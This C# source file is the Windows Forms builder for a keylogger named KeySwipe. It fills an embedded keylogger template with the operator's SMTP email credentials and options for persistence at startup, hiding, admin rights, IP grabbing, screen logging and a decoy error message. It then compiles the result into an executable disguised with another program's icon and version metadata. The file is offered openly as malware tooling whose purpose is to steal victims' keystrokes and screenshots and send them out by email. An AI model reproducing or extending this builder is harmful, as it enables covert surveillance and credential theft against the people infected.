using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Drawing.Imaging;
using System.Security.Cryptography;

namespace KeySwipe_Keylogger
{
    public partial class Form1 : Form
    {
        //ints
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        public static string savename;
        //Strings
        public static string company;
        public static string Copyright;
        public static string name;
        public static string description;
        public static string version;
        public static string icon;
        

        //Dlls
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        public Form1()
        {
            InitializeComponent();
            tbbody.Enabled = false;
            tbtitle.Enabled = false;
            comboBox1.Enabled = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            button3.BackColor = Color.Black;
            button4.BackColor = Color.Black;
            button1.BackColor = Color.Gray;
            tabControl1.SelectedIndex = 0;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            button3.BackColor = Color.Black;
            button4.BackColor = Color.Gray;
            button1.BackColor = Color.Black;
            tabControl1.SelectedIndex = 1;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            button3.BackColor = Color.Gray;
            button4.BackColor = Color.Black;
            button1.BackColor = Color.Black;
            tabControl1.SelectedIndex = 2;
        }

        private void tabControl1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void tabPage1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void tabPage2_Click(object sender, EventArgs e)
        {
        }

        private void tabPage3_Click(object sender, EventArgs e)
        {
        }

        private void tabPage3_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void tabPage2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            button1.BackColor = Color.Gray;
            nuddelay.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                var login = new NetworkCredential(tbemail.Text, tbpass.Text);
                var client = new SmtpClient();
                client.Host = tbhost.Text;
                client.Port = Convert.ToInt32(tbport.Text);
                client.EnableSsl = true;
                client.Credentials = login;
                client.Send(new MailMessage(tbemail.Text, tbemail.Text)
                {
                    Subject = "SMTP Test | KeySwipe",
                    BodyEncoding = Encoding.UTF8,
                    IsBodyHtml = true,
                    DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure
                });
                MessageBox.Show("Your settings worked!", "SMTP Test | KeySwipe", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }catch(Exception)
            {
                MessageBox.Show("Your smtp settings failed.", "SMTP Test | KeySwipe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBox9.Checked)
            {
                nuddelay.Enabled = true;
            }else
            {
                nuddelay.Enabled = false;
            }
        }

        private void tbemail_MouseHover(object sender, EventArgs e)
        {
            
        }

        private void tbemail_MouseMove(object sender, MouseEventArgs e)
        {

        }

        private void button1_MouseMove(object sender, MouseEventArgs e)
        {
        }

        private void button8_Click(object sender, EventArgs e)
        {
            var f = new OpenFileDialog();
            f.Filter = ".ico|*.ico";
            f.InitialDirectory = @"C:/";
            f.Title = "Change Icon | KeySwipe";
            f.ShowDialog();
            icon = f.FileName;
            if (string.IsNullOrEmpty(icon))
            {
                icon = null;
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            var t = new OpenFileDialog();
            t.Filter = ".exe|*.exe";
            if(t.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            FileVersionInfo file = FileVersionInfo.GetVersionInfo(t.FileName);
            company = file.CompanyName;
            Copyright = file.LegalCopyright;
            name = file.ProductName;
            description = file.FileDescription;
            version = file.ProductVersion;
        }

        private void button10_Click(object sender, EventArgs e)
        {
            string msgboxicon = comboBox1.Text;
            SaveFileDialog f = new SaveFileDialog();
            f.DefaultExt = ".exe";
            f.Filter = "exe|*.exe";
            f.InitialDirectory = @"C:/";
            f.Title = "Save as | KeySwipe";
            f.AddExtension = false;
            if(f.ShowDialog() == DialogResult.OK)
            {
                savename = f.FileName;
            }else
            {
                return;
            }
            string keylogger = Properties.Resources.Keylogcode;
            StringBuilder sb = new StringBuilder(keylogger);
            sb.Replace("_email", tbemail.Text);
            sb.Replace("_pass", tbpass.Text);
            sb.Replace("_SMTPhost", tbhost.Text);
            sb.Replace("_SMTPport", tbport.Text);
            string interval = numericUpDown2.Value.ToString();
            sb.Replace("%INTERVAL%", interval);


            if(checkBox9.Checked)
            {
                sb.Replace("_sleep", "true");
                int val = int.Parse(nuddelay.Value.ToString());
                int value = val * 1000;
                sb.Replace("_ms", value.ToString());
            }else
            {
                sb.Replace("_sleep", "false");
                sb.Replace("_ms", "5");
            }
            if(checkBox4.Checked)
            {
                sb.Replace("_info", "true");
            }else
            {
                sb.Replace("_info", "false");
            }
            if(chbmessage.Checked)
            {
                sb.Replace("%Message%", "true");
                sb.Replace("_BODY", tbbody.Text);
                sb.Replace("_TITLE", tbtitle.Text);
                sb.Replace("_Buttons", "MessageBoxButtons.OK");
                sb.Replace("_Icon", "MessageBoxIcon." + msgboxicon);
            }else
            {
                sb.Replace("%Message%", "false");
                sb.Replace("_BODY", tbbody.Text);
                sb.Replace("_TITLE", tbtitle.Text);
                sb.Replace("_Buttons", "MessageBoxButtons.OK");
                sb.Replace("_Icon", "MessageBoxIcon.Error");
            }
            if(checkBox1.Checked)
            {
                sb.Replace("%adm%", "true");
            }else
            {
                sb.Replace("%adm%", "false");
            }
            if(checkBox6.Checked)
            {
                sb.Replace("%GETIP%", "true");
            }else
            {
                sb.Replace("%GETIP%", "false");
            }
            if(checkBox3.Checked)
            {
                sb.Replace("_startup", "true");
            }else
            {
                sb.Replace("_startup", "false");
            }
            if(checkBox2.Checked)
            {
                sb.Replace("_dis", "true");
            }else
            {
                sb.Replace("_dis", "false");
            }
            if(checkBox6.Checked)
            {
                sb.Replace("_screenlog", "true");
            }else
            {
                sb.Replace("_screenlog", "false");
            }
            if(checkBox7.Checked)
            {
                sb.Replace("_hidden", "true");
            }else
            {
                sb.Replace("_hidden", "false");
            }
            if(checkBox8.Checked)
            {
                sb.Replace("%dropthis%", "true");
            }else
            {
                sb.Replace("%dropthis%", "false");
            }
            string code = sb.ToString();
            var references = new string[] { "System.Dll", "System.Net.Dll", "System.Net.Sockets.Dll", "System.Core.Dll", "System.Windows.Forms.Dll", "System.Management.Dll", "System.Runtime.InteropServices.Dll", "System.Drawing.Dll" };
            var results = CompileSource(new[] { code }, savename, references);
            if (results.Errors.Count == 0)
            {
                MessageBox.Show("Succesfully compiled to " + savename, "Compiler", MessageBoxButtons.OK, MessageBoxIcon.Information);
                icon = null;
                savename = null;
            }
            else
            {
                foreach (CompilerError error in results.Errors)
                {
                    MessageBox.Show(error.ErrorText, "Compiler", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
        public static CompilerResults CompileSource(string[] sources, string output, params string[] references)
        {
            var parameters = new CompilerParameters(references, output);
            if (!string.IsNullOrEmpty(icon))
            {
                parameters.CompilerOptions = @"/win32icon:" + icon;
            }
            parameters.GenerateExecutable = true;
            using (var provider = new CSharpCodeProvider())
                return provider.CompileAssemblyFromSource(parameters, sources);
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(comboBox1.SelectedItem.ToString() == "Error")
            {
                pbicon.Image = Properties.Resources.error;
            }else if(comboBox1.SelectedItem.ToString() == "Information")
            {
                pbicon.Image = Properties.Resources.Information;
            }
            else if(comboBox1.SelectedItem.ToString() == "Warning")
            {
                pbicon.Image = Properties.Resources.Warning;
            }
            else
            {
                pbicon.Image = null;
            }
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {
            return;
        }

        private void chbmessage_CheckedChanged(object sender, EventArgs e)
        {
            if(this.chbmessage.Checked)
            {
                tbbody.Enabled = true;
                tbtitle.Enabled = true;
                comboBox1.Enabled = true;
            }else
            {
                tbbody.Enabled = false;
                tbtitle.Enabled = false;
                comboBox1.Enabled = false;
            }
        }
    }
}
